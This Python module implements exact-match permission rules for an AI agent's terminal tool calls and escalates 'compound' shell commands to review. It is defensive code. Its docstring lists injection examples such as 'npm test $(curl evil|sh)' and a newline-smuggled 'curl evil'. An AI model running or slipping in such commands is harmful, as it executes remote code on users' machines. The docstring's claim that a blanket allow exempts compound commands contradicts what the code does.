"""`permissions.json` rule matching against one tool call — the part
01-w2-interfaces.md §4.1 explicitly deferred: "match 是...不透明标识...W2 不做
glob/正则重叠判定——裁决引擎是 W3 FR05 的范围，这里只做'两条规则是否管同一件事'的
key 相等比较". This module IS that engine (Issue #11 / 02-w3-interfaces.md §1.1).

## Round 4 rewrite (2026-09-19, controller ruling R1/R2 — "改前提，不打补丁")

Rounds 1–3 (see `_hard_deny.py`'s module docstring for the fuller history)
progressively widened a PREFIX match ("does the command's leading tokens
start with the rule's `match` tokens") into a "segment-aware" one (does
every top-level `&&`/`;`/`|`/`&`/newline-delimited segment match some rule)
plus ad-hoc detection of `$(...)`/backtick/redirection riding along inside a
matched segment — three rounds of finding one more shell construct the
matcher didn't know was a boundary. The controller's ruling changes the
premise instead of finding a fourth: **an `allow` rule's `match` is no
longer a prefix, or a segment, of anything — it must equal the ENTIRE
(whitespace-normalized) command text, exactly.**

A rule's `match` is either:
  - an exact tool name (matches every call to that tool — for
    `action="allow"` this is the intentional, broad "allow this whole tool"
    shape 02-w3-interfaces.md §1.1 documents, unaffected by this rewrite —
    args are never consulted for it), or
  - for the `terminal` tool specifically: the terminal call's ENTIRE
    `command` text, compared to `match` after `_normalize` (strip leading/
    trailing whitespace, collapse every run of internal whitespace to one
    space — no shell parsing of either string at all). `npm test&curl`,
    `npm test ;curl`, `npm test $(curl evil|sh)`, `npm test > ~/.zshrc`,
    `npm test\\ncurl evil` are all simply NOT EQUAL to the normalized string
    `"npm test"` — no shlex, no operator list, no segment boundary a wrapper
    could hide behind, because nothing here parses shell syntax to decide
    that at all. This is what "统一为「规范化后整串相等」匹配" means: allow
    is exact-match-or-nothing, and (see `_MATCH_ONLY_TERMINAL_RULES` isn't a
    thing any more) so is a narrow `deny` rule's command text — the whole-
    tool blanket shape is still the one broad exception, same as before.

`permission.decide(remember=...)` (`sessions/service.py::_remember_allow`)
already writes `{"match": <the exact command text the user approved>,
"action": "allow"}` — a single, specific command string, never a prefix by
construction — so this rewrite doesn't change what `remember` writes, only
how strictly it (and any hand-written `permissions.json` rule) is compared
against a later call: "收窄到具体 match" now means what it always should
have: THAT command, not anything starting with it.

## `compound` commands never take the allow fast path (controller ruling R2)

Independent of whether a rule matches: a command containing any of
`; & | \\`` `$(` or a literal newline is `compound`, and `decide()` never
returns `"allow"` for one — not even when a `permissions.json` rule's
`match` text happens to equal the compound string verbatim (a user CAN
still write `{"match": "terminal", "action": "allow"}` — the blanket
whole-tool shape is the one deliberate "trust everything" escape hatch, and
stays exempt from this, same as it's always been documented to be). A
compound command that doesn't match a whole-tool allow rule always escalates
to the daemon's review gate (`permissions/review.py::classify()` never
returns `low` for a `terminal` call, so this can never silently execute
unreviewed — see that module).

Self-contained (stdlib only) — see `__init__.py`'s module docstring; this
module has no dependency on `_hard_deny.py` any more (round 1–3's shared
`_split_shell_segments` is gone along with the whole segment-matching
apparatus — deleting `_is_command_prefix`-style matching left nothing here
for the two modules to share).
"""

from __future__ import annotations

from typing import Any, Literal

Action = Literal["allow", "deny"]

# Controller ruling R2: these characters (or a literal newline) anywhere in
# the raw command text mark it `compound` — a purely textual check, no
# shell parsing, deliberately independent of `_hard_deny.py`'s tokenizer.
_COMPOUND_MARKERS = (";", "&", "|", "`", "$(", "\n")


def _command_text(tool_name: str, args: dict[str, Any]) -> str | None:
    if tool_name == "terminal":
        command = args.get("command")
        return command if isinstance(command, str) and command else None
    return None


def _normalize(text: str) -> str:
    """Controller ruling R1: "去首尾空白、把连续空白折成一个空格，不做任何 shell
    解析" — `str.split()` with no argument already splits on any run of
    whitespace (spaces, tabs, newlines) and drops empty pieces, so
    `" ".join(text.split())` is exactly that normalization in one line."""
    return " ".join(text.split())


def is_compound_command(command: str) -> bool:
    return any(marker in command for marker in _COMPOUND_MARKERS)


def _actions_for_exact_match(rules: list[dict[str, Any]], match_value: str) -> set[str]:
    return {
        rule.get("action")
        for rule in rules
        if isinstance(rule, dict) and rule.get("match") == match_value
        and rule.get("action") in ("allow", "deny")
    }


def _actions_for_normalized_command(
    rules: list[dict[str, Any]], *, tool_name: str, normalized_command: str
) -> set[str]:
    out: set[str] = set()
    for rule in rules:
        if not isinstance(rule, dict):
            continue  # malformed rules.json entry (e.g. a bare string) -> skipped, not raised
        match, action = rule.get("match"), rule.get("action")
        if action not in ("allow", "deny") or not isinstance(match, str):
            continue
        if match == tool_name:
            continue  # the blanket whole-tool shape, handled separately
        if _normalize(match) == normalized_command:
            out.add(action)
    return out


def decide(rules: list[dict[str, Any]], tool_name: str, args: dict[str, Any]) -> Action | None:
    """Return `"deny"`/`"allow"` if this call is covered by a
    `permissions.json` rule, `None` if nothing applies (falls through to the
    daemon's review/user gate). See the module docstring for the exact-
    whole-string-match semantics and the `compound` carve-out."""
    if not isinstance(rules, list):
        return None

    tool_actions = _actions_for_exact_match(rules, tool_name)
    if "deny" in tool_actions:
        return "deny"

    command = _command_text(tool_name, args)
    if command is None:
        # Non-terminal tool call (or a terminal call with no command text to
        # compare): only the blanket exact-tool-name rule above applies.
        return "allow" if "allow" in tool_actions else None

    normalized = _normalize(command)
    command_actions = _actions_for_normalized_command(
        rules, tool_name=tool_name, normalized_command=normalized
    )
    if "deny" in command_actions:
        return "deny"

    if is_compound_command(command):
        # Controller ruling R2: a compound command never takes the allow
        # fast path — always escalate, regardless of what matched (including
        # a whole-tool blanket allow whose `match` isn't specific to this
        # command's text at all, and so was never "about" this particular
        # compound command in the first place).
        return None

    if "allow" in tool_actions or "allow" in command_actions:
        return "allow"
    return None
